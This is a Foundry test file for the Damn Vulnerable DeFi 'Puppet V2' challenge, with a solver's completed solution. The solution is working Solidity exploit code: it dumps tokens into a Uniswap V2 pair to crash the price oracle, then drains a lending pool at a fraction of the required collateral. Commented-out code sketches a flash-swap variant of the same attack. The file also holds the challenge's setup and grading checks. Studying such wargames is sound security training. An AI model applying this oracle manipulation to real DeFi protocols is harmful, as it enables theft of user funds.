// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // *******************
        // Observation
        // 1. First sight, not another oracle based on uniswap v2 pair price quote/
        // 2. First thought, take out weth flash loan from the pair to skew the price quote
        // 3. Second thought, we may create enough price collapse if the swap in all of our DVT tokens
        // 4. Let's calculate
        // 5. Also further investigation into UniswabV2Library's quote(), I notice that it's returning the ratio of the last transaction,
        // as such not subjected to a single transaction manipulation. Seems like swap and causes price impact is the only way to go.
        // *******************
        uint256 amountIn = PLAYER_INITIAL_TOKEN_BALANCE;
        uint256 estimateReserveIn = UNISWAP_INITIAL_TOKEN_RESERVE;
        uint256 estimateReserveOut = UNISWAP_INITIAL_WETH_RESERVE;

        uint256 estimateAmountInWithFee = amountIn * 997;
        uint256 estimateNumerator = estimateAmountInWithFee * estimateReserveOut;
        uint256 estimateDenominator = (estimateReserveIn * 1000) + estimateAmountInWithFee;
        uint256 estimateAmountOut = estimateNumerator / estimateDenominator;

        console.log("Initial Token Reserve:", UNISWAP_INITIAL_TOKEN_RESERVE);
        console.log("Initial WETH Reserve:", UNISWAP_INITIAL_WETH_RESERVE);
        console.log("Player's Token Balance:", PLAYER_INITIAL_TOKEN_BALANCE);
        console.log("Amount of WETH received:", estimateAmountOut);

        uint256 newTokenReserve = estimateReserveIn + amountIn;
        uint256 newWethReserve = estimateReserveOut - estimateAmountOut;

        console.log("Final Token Reserve:", newTokenReserve);
        console.log("Final WETH Reserve:", newWethReserve);

        // Calculate price impact
        uint256 priceImpact = (
            (estimateReserveOut * 1e18 / estimateReserveIn) - (newWethReserve * 1e18 / newTokenReserve)
        ) * 100 / (estimateReserveOut * 1e18 / estimateReserveIn);
        console.log("Price Impact: ", priceImpact, "%");

        console.log("Player's ETH: ", estimateAmountOut + PLAYER_INITIAL_ETH_BALANCE);

        uint256 poolTokenWorth = newWethReserve * 1_000_000e18 / newTokenReserve;

        console.log("The worth of pool's 1 million DVT in WETH: ", poolTokenWorth, "in ETH wei");
        console.log(
            "The ETH needed to borrow 1 million DVT from pool based on 3x collateral factor: ", poolTokenWorth * 3
        );

        if (poolTokenWorth * 3 < estimateAmountOut + PLAYER_INITIAL_ETH_BALANCE) {
            console.log("Swap in slippage is sufficient to cause price collapse, flash loan not needed");
        } else {
            console.log("The slippage caused by swapping in is insufficient, you need flash loan");
        }

        // ********************

        uint256 dvtBalance = token.balanceOf(player);
        require(dvtBalance > 0, "No DVT to swap");

        // Approve the Uniswap Router to spend player's tokens
        token.approve(address(uniswapV2Router), dvtBalance);

        // Swap DVT for ETH (via WETH)
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // Perform the swap through the router
        uniswapV2Router.swapExactTokensForETH(dvtBalance, 0, path, player, block.timestamp);

        // Log the final balances after the swap
        console.log("WETH balance of player after swap: ", weth.balanceOf(player));
        console.log("DVT balance of player after swap: ", token.balanceOf(player));
        console.log("ETH balance of player after swap: ", player.balance);
        // ********************

        uint256 amountAsCollateral = lendingPool.calculateDepositOfWETHRequired(1_000_000e18);
        console.log("ETH Collateral Needed: ", amountAsCollateral);
        weth.deposit{value: amountAsCollateral}();
        weth.approve(address(lendingPool), amountAsCollateral);
        lendingPool.borrow(1_000_000e18);

        token.transfer(recovery, token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

// Logs:
//   Initial Token Reserve: 100000000000000000000 = 100e18 DVT
//   Initial WETH Reserve: 10000000000000000000 = 10e18 ETH
//   Initial Ratio: 1 DVT = 0.1 ETH
//   Player's Token Balance: 10000000000000000000000 = 10_000e18 DVT
//   Amount of WETH received: 9900695134061569016 = 9.9 ETH
//   Final Token Reserve: 10100000000000000000000 = 10_100e18 DVT
//   Final WETH Reserve: 99304865938430984 = 0.0993 ETH
//   Price Impact:  99 %
//   Player's ETH:  29900695134061569016 = 29.9 ETH

// interface IUniswapV2Callee {
//     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
// }

// interface IERC20 {
//     function totalSupply() external view returns (uint256);
//     function balanceOf(address account) external view returns (uint256);
//     function transfer(address to, uint256 amount) external returns (bool);
//     function allowance(address owner, address spender) external view returns (uint256);
//     function approve(address spender, uint256 amount) external returns (bool);
//     function transferFrom(address from, address to, uint256 amount) external returns (bool);
//     function name() external view returns (string memory);
//     function symbol() external view returns (string memory);
//     function decimals() external view returns (uint8);
// }

// contract FlashManipulator is IUniswapV2Callee {
//     address owner;
//     IUniswapV2Pair pair;
//     PuppetV2Pool pool;
//     WETH weth;
//     IERC20 token;

//     constructor(address _pair, address _pool, address payable _weth, address _token) {
//         owner = msg.sender;
//         pair = IUniswapV2Pair(_pair);
//         pool = PuppetV2Pool(_pool);
//         weth = WETH(_weth);
//         token = IERC20(_token);
//     }

//     function flashSwap() external payable {
//         require(msg.sender == owner, "FlashManipulator: Only owner can call");

//         (uint112 reserve0, uint112 reserve1,) = pair.getReserves();

//         uint256 amount0Out;
//         uint256 amount1Out;

//         if (address(weth) == pair.token0()) {
//             amount0Out = uint256(reserve0) - 1;
//         } else {
//             amount1Out = uint256(reserve1) - 1;
//         }
//         pair.swap(amount0Out, amount1Out, address(this), abi.encode(msg.sender));
//     }

//     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
//         address recipient = abi.decode(data, (address));
//         uint256 wethBorrowed = address(weth) == pair.token0() ? amount0 : amount1;
//         uint256 tokenToRepay = (wethBorrowed * 1000) / 997 + 1;
//         weth.approve(address(pool), type(uint256).max);
//         console.log("Amount needed to deposit: ", pool.calculateDepositOfWETHRequired(1_000_000e18));
//         pool.borrow(1_000_000e18);
//         require(false, "Here");
//         token.transfer(recipient, 1_000_000e18);
//         uint256 ethToDeposit = tokenToRepay - wethBorrowed;
//         weth.deposit{value: ethToDeposit}();
//         weth.transfer(address(pair), tokenToRepay);
//         uint256 remainingWeth = weth.balanceOf(address(this));
//         if (remainingWeth > 0) {
//             weth.transfer(recipient, remainingWeth);
//         }
//     }

//     function recoverERC20(address _token) external {
//         require(msg.sender == owner, "FlashManipulator: Only owner can call");
//         IERC20 token = IERC20(_token);
//         token.transfer(msg.sender, token.balanceOf(address(this)));
//     }

//     function recoverETH() external {
//         require(msg.sender == owner, "FlashManipulator: Only owner can call");
//         payable(msg.sender).transfer(address(this).balance);
//     }

//     receive() external payable {}
// }
